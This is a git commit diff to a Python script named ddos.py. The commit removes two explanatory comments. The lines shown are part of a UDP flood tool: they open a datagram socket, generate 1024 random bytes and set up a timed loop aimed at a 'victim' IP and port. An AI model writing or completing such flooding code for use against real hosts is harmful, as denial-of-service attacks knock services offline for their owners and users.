93cb884cdffd2ceafddb8ab51171375fab6de81f
Dima-git-hak <82115394+Dima-git-hak@users.noreply.github.com>
2021-06-11 13:02:02 +0200

    Add files via upload

--- ddos.py
+++ ddos.py
@@ -9,9 +9,9 @@ def usage():
     print "Command: " + sys.argv[0] + " <ip> <port> <packet>"
 
 def flood(victim, vport, duration):
-    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+    
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 1024 representes one byte to the server
+    
     bytes = random._urandom(1024)
     timeout =  time.time() + duration
     sent = 3000
